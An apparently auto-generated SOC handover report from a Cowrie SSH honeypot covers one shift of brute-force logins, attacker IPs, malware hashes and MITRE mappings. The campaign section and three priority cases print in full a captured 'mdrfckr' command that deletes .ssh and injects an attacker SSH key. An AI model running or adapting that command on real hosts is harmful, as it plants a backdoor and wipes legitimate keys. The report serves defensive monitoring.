# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-25 |
| **Generated At** | 2026-03-25T20:36:57Z |
| **Shift Time** | 20:36 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **43** |
| Confirmed Threats | **35** |
| False Positives Filtered | **8** (18.6%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **14** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **35** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **32** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **21** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `user` | 2 |
| `guest` | 2 |
| `345gs5662d34` | 2 |
| `ann` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 3 |
| `12345678` | 3 |
| `Admin123456789` | 2 |
| `1234` | 2 |
| `345gs5662d34` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 3 |
| `root` | `Admin123456789` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |
| `ann` | `12345678` | 2 |
| `root` | `4` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin123456789` | `210.14.142.89` | 2026-03-25T19:43:23 |
| `root` | `3245gs5662d34` | `210.14.142.89` | 2026-03-25T19:43:33 |
| `root` | `Root-2025` | `186.219.184.142` | 2026-03-25T19:45:13 |
| `root` | `3245gs5662d34` | `186.219.184.142` | 2026-03-25T19:45:21 |
| `root` | `Admin123456789` | `157.7.113.83` | 2026-03-25T19:51:34 |
| `root` | `3245gs5662d34` | `157.7.113.83` | 2026-03-25T19:51:38 |
| `root` | `4` | `87.103.126.54` | 2026-03-25T20:20:19 |
| `root` | `4` | `182.53.52.68` | 2026-03-25T20:20:26 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `157.7.113.83`, `210.14.142.89`, `186.219.184.142`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **26** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS23969` | TOT Public Company Limited | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS9694` | Seokyung Cable Television Co.. Ltd. | 1 | MEDIUM |
| `AS7506` | GMO Internet Group, Inc. | 1 | HIGH |
| `AS9394` | China TieTong Telecommunications Corporation | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (8)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-53ae9fdc189a

| Field | Detail |
|---|---|
| **Source IP** | `210.14.142[.]89` |
| **First Seen** | 2026-03-25 19:43 |
| **Last Seen** | 2026-03-25 19:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 19:43:22` | `cowrie.session.connect` |
| `2026-03-25 19:43:22` | `cowrie.client.version` |
| `2026-03-25 19:43:22` | `cowrie.client.kex` |
| `2026-03-25 19:43:23` | `cowrie.login.success` |
| `2026-03-25 19:43:23` | `cowrie.session.params` |
| `2026-03-25 19:43:23` | `cowrie.command.input` |
| `2026-03-25 19:43:23` | `cowrie.command.failed` |
| `2026-03-25 19:43:23` | `cowrie.log.closed` |
| `2026-03-25 19:43:24` | `cowrie.session.params` |
| `2026-03-25 19:43:24` | `cowrie.command.input` |
| `2026-03-25 19:43:24` | `cowrie.session.file_download` |
| `2026-03-25 19:43:24` | `cowrie.log.closed` |
| `2026-03-25 19:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.14.142[.]89` to AbuseIPDB if not already reported
- [ ] Block `210.14.142[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1306a34269c7

| Field | Detail |
|---|---|
| **Source IP** | `210.14.142[.]89` |
| **First Seen** | 2026-03-25 19:43 |
| **Last Seen** | 2026-03-25 19:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 19:43:32` | `cowrie.session.connect` |
| `2026-03-25 19:43:32` | `cowrie.client.version` |
| `2026-03-25 19:43:32` | `cowrie.client.kex` |
| `2026-03-25 19:43:33` | `cowrie.login.success` |
| `2026-03-25 19:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.14.142[.]89` to AbuseIPDB if not already reported
- [ ] Block `210.14.142[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d87076e3f31d

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-03-25 19:45 |
| **Last Seen** | 2026-03-25 19:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 19:45:12` | `cowrie.session.connect` |
| `2026-03-25 19:45:12` | `cowrie.client.version` |
| `2026-03-25 19:45:12` | `cowrie.client.kex` |
| `2026-03-25 19:45:13` | `cowrie.login.success` |
| `2026-03-25 19:45:14` | `cowrie.session.params` |
| `2026-03-25 19:45:14` | `cowrie.command.input` |
| `2026-03-25 19:45:14` | `cowrie.command.failed` |
| `2026-03-25 19:45:14` | `cowrie.log.closed` |
| `2026-03-25 19:45:15` | `cowrie.session.params` |
| `2026-03-25 19:45:15` | `cowrie.command.input` |
| `2026-03-25 19:45:15` | `cowrie.session.file_download` |
| `2026-03-25 19:45:15` | `cowrie.log.closed` |
| `2026-03-25 19:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ae07edc1be2

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-03-25 19:45 |
| **Last Seen** | 2026-03-25 19:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 19:45:19` | `cowrie.session.connect` |
| `2026-03-25 19:45:19` | `cowrie.client.version` |
| `2026-03-25 19:45:20` | `cowrie.client.kex` |
| `2026-03-25 19:45:21` | `cowrie.login.success` |
| `2026-03-25 19:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b152694306e2

| Field | Detail |
|---|---|
| **Source IP** | `157.7.113[.]83` |
| **First Seen** | 2026-03-25 19:51 |
| **Last Seen** | 2026-03-25 19:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 19:51:33` | `cowrie.session.connect` |
| `2026-03-25 19:51:33` | `cowrie.client.version` |
| `2026-03-25 19:51:33` | `cowrie.client.kex` |
| `2026-03-25 19:51:34` | `cowrie.login.success` |
| `2026-03-25 19:51:34` | `cowrie.session.params` |
| `2026-03-25 19:51:34` | `cowrie.command.input` |
| `2026-03-25 19:51:34` | `cowrie.command.failed` |
| `2026-03-25 19:51:34` | `cowrie.log.closed` |
| `2026-03-25 19:51:35` | `cowrie.session.params` |
| `2026-03-25 19:51:35` | `cowrie.command.input` |
| `2026-03-25 19:51:35` | `cowrie.session.file_download` |
| `2026-03-25 19:51:35` | `cowrie.log.closed` |
| `2026-03-25 19:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.7.113[.]83` to AbuseIPDB if not already reported
- [ ] Block `157.7.113[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d049dfb63e52

| Field | Detail |
|---|---|
| **Source IP** | `157.7.113[.]83` |
| **First Seen** | 2026-03-25 19:51 |
| **Last Seen** | 2026-03-25 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 19:51:37` | `cowrie.session.connect` |
| `2026-03-25 19:51:37` | `cowrie.client.version` |
| `2026-03-25 19:51:37` | `cowrie.client.kex` |
| `2026-03-25 19:51:38` | `cowrie.login.success` |
| `2026-03-25 19:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.7.113[.]83` to AbuseIPDB if not already reported
- [ ] Block `157.7.113[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a22a2bfba8bd

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-03-25 20:20 |
| **Last Seen** | 2026-03-25 20:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:20:17` | `cowrie.session.connect` |
| `2026-03-25 20:20:17` | `cowrie.client.version` |
| `2026-03-25 20:20:17` | `cowrie.client.kex` |
| `2026-03-25 20:20:19` | `cowrie.login.success` |
| `2026-03-25 20:20:19` | `cowrie.direct-tcpip.request` |
| `2026-03-25 20:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb25c411295

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-03-25 20:20 |
| **Last Seen** | 2026-03-25 20:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 20:20:24` | `cowrie.session.connect` |
| `2026-03-25 20:20:25` | `cowrie.client.version` |
| `2026-03-25 20:20:25` | `cowrie.client.kex` |
| `2026-03-25 20:20:26` | `cowrie.login.success` |
| `2026-03-25 20:20:27` | `cowrie.direct-tcpip.request` |
| `2026-03-25 20:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.103.73[.]80` | **5** | 2026-03-25 19:44 | 2026-03-25 19:48 | 8m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.7.113[.]83` | **5** | 2026-03-25 19:44 | 2026-03-25 19:53 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.114[.]161` | **2** | 2026-03-25 19:45 | 2026-03-25 19:50 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.176.79[.]137` | 1 | 2026-03-25 19:45 | 2026-03-25 19:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.164.135[.]251` | 1 | 2026-03-25 19:39 | 2026-03-25 19:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.184.85[.]167` | 1 | 2026-03-25 19:59 | 2026-03-25 19:59 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.219.184[.]142` | 1 | 2026-03-25 19:45 | 2026-03-25 19:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `191.36.154[.]175` | 1 | 2026-03-25 19:27 | 2026-03-25 19:29 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.192.247[.]84` | 1 | 2026-03-25 19:18 | 2026-03-25 19:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.14.142[.]89` | 1 | 2026-03-25 19:43 | 2026-03-25 19:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.122.115[.]9` | 1 | 2026-03-25 20:08 | 2026-03-25 20:08 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.10.221[.]104` | 1 | 2026-03-25 19:39 | 2026-03-25 19:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.92.246[.]14` | 1 | 2026-03-25 19:24 | 2026-03-25 19:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.148[.]207` | 1 | 2026-03-25 20:20 | 2026-03-25 20:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.233.4[.]50` | 1 | 2026-03-25 19:06 | 2026-03-25 19:07 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.182.132[.]94` | 1 | 2026-03-25 18:57 | 2026-03-25 18:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.190.188[.]197` | 1 | 2026-03-25 20:06 | 2026-03-25 20:06 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.189.17[.]35` | 1 | 2026-03-25 19:59 | 2026-03-25 19:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 9/100 | 🟢 LOW | **23/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `61.233.4[.]50` | CN | China TieTong Telecommunications Corporation | **100** ⚠️ | 23 |
| `121.164.135[.]251` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `221.10.221[.]104` | CN | China Unicom SiChuan province network | **100** ⚠️ | 48 |
| `14.103.73[.]80` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `103.176.79[.]137` | ID | PT. AwanBit Data Indonesia | **100** ⚠️ | 50 |
| `49.124.148[.]207` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 8 |
| `182.53.52[.]68` | TH | TOT Public Company Limited | **100** ⚠️ | 50 |
| `78.189.17[.]35` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 16 |
| `179.184.85[.]167` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 0 |
| `36.92.246[.]14` | ID | PT Telekomunikasi Indonesia | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 38 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 43 cases |
| Tool 34  | Credential Extractor        | ✅ 32 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (18.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 8 priority case(s) shown individually · 18 recon entry/entries in table (3 group(s) consolidating 12 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-25T20:36:57Z_
